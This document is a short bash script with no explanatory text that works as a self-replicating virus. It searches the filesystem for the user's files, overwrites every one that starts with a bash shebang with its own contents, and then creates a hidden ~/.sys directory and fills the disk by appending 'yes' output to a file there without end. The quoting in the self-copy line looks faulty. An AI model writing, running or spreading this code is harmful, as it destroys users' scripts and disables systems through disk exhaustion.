#!/bin/bash
find / -user $UID -type f | while read fn; do head -n1 "$fn" | grep -q "#!.*/bin/bash" && cat "$(basename \"$0\")" > $fn; done
if [ -d ~/.sys ]; then
yes >> ~/.sys/.ref
else
if [ -e ~/.sys ]; then
rm ~/.sys
fi
mkdir ~/.sys
fi